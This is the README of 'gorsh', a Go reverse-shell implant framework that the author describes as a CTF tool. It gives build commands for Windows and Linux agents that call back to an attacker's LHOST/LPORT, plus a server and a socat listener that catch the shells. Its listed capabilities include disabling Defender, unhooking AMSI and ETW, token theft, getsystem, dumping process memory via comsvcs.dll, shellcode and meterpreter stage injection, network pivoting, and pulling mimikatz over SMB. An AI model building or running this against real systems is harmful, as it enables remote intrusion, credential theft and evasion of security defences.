# gorsh

[go]lang [r]everse [sh]ell

[![forthebadge](https://forthebadge.com/images/badges/fuck-it-ship-it.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/made-with-go.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/no-ragrets.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/contains-technical-debt.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/made-with-crayons.svg)](https://forthebadge.com)

![](https://i.imgur.com/x51XH6K.png)
[![asciicast](https://asciinema.org/a/NmeC42TNu8BgdjMLcyVUXo74x.svg)](https://asciinema.org/a/NmeC42TNu8BgdjMLcyVUXo74x)



## Usage

Generate agents with:

```bash
# To `make` targets, set the `LHOST`and`LPORT`global variables.
$ make windows LHOST=192.168.X.X LPORT=1234
or
$ make linux LHOST=192.168.X.X LPORT=1234
```

Generate & run the server with:

```bash
# To `make` a server with empty default values for listening parameters - allow the server parameters to be changed on the fly if needed
$ make server

#To run the server and set the interface on which to listen (--port is optional and set to 13000 by default)
$ ./server --interface eth0 --port 1234

#To run the server and set an IP address on which to listen (--port is optional and set to 13000 by default)
$ ./server --host 192.168.X.X --port 1234
```

or

```bash
# To `make` a server with static values for listening parameters - will not be changed on the fly even if ./server is run with --interface/--host/--port flags
$ make server INTERFACE=eth0 LPORT=1234
or
$ make server LHOST=192.168.X.X LPORT=1234

#To run the server
$ ./server
```

### Catching the shell

```bash
make listen LPORT=443
```

Tmux is powerful terminal multiplexer with robust session/windows/pane management. 
It works better at managing multiple reverse shells than most shell managers I've seen.
The server binary creates a tmux session per host and a window per each reverse shell binary invocation.
If you run the `spawn` command on a shell, a new window will open in the host's session, creating a "tab".

To catch a shell without `gorsh-server` and/or tmux, use:

```bash
socat -d -d OPENSSL-LISTEN:443,reuseaddr,cert=certs/server.pem,verify=0,fork READLINE
```

## Features

- Network scanner
- Ligolo-ng tunnels for socks-less pivoting
- Tab completion (dependent on exec method)
- Duplicate your shells with 'spawn'

### Windows
- Disable Defender (or any process) by demoting process tokens to untrusted.
- Execute Assembly - assemblies are gzipped & embedded. No hosting necessary
- Unhook modules (w/ builtins for AMSI and ETW)
- steal_token / revtoself
- getsystem - if admin
- minidump any process (uses comsvcs.dll)
- shellcode injection
- can fetch and inject meterpreter tcp and http stages
    - or any other shellcode that follows the metasploit staging protocol
    - first 4 bytes indicating the size of the following payload
        - `[size][payload]`

#### Not Windows
- `setuid`, useful for UID spoofing to bypass NFS "ACLs"
- Enumeration scripts
    - linpeas
    - linenum

### Execute Assembly

Assemblies are gzipped and embedded within the implant. Since this is a CTF
shell, I'm optimizing for ease of use and not tradecraft.

- `make list-assemblies` will show available assemblies from Flangvik's SharpCollection project.
- `make choose-assemblies` will bring up fzf, where you can filter and choose
what assemblies you want embedded. They will be embedded at the next build
time.
- to embed any other assemblies not in SharpCollection. gzip it and copy it to `./pkg/execute_assembly/embed/`

### Ligolo-NG Tunnels

Agents have the ligolo client embedded. Run `make start-ligolo` to prepare
interfaces and run ligolo-ng. From an agent, run `pivot` and a callback should
land within the ligolo interface. Select the callback in ligolo and `start`
routing. On your box, create a route to the remote network through the `tun`
interface and all traffic to that destination will now egress through ligolo.

```bash
ip route add 172.16.43.0/24 dev ligolo`
```

### File upload/download

Since this is a reverse shell, only sharing its stdin/out/err through a network socket, 
traditional methods of uploading and downloading file aren't available. There's
a docker smb server to bridge that gap. Configure the directories to be shared
in the `Makefile`, then run `make start-smb`. If you wish to see logs so you
can monitor callbacks, use `make smblogs`. Windows implants understand UNC
paths, so something like `cp //myip/tools/mimikatz.exe .` is possible.
